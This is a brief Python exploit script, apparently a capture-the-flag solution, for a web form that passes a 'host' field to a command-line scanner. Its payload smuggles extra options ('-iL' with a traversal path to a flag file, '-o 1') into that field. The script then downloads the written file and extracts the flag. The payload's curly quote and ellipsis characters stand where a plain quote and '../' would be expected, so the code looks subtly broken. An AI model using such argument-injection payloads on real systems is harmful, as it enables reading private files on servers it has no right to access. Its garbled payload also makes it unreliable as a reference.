from sys import argv

if __name__ == '__main__':
    try:
        url = argv[1]
    except Exception as e:
        print("python3 exp.py url")
    else:
        from requests import (post, get)

        payload = "host=127.0.0.1’ -iL …/…/…/…/flag -o 1"

        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/109.0.0.0 Safari/537.36 '
        }

        payload = {
            "host": "127.0.0.1’ -iL …/…/…/…/flag -o 1"
        }
        response = post(url=url, headers=headers, data=payload).text

        from re import findall

        flag_index = get(url=url+"1", headers=headers).text
        flag = ''.join(findall('flag{.*?}', flag_index))
        print(flag)
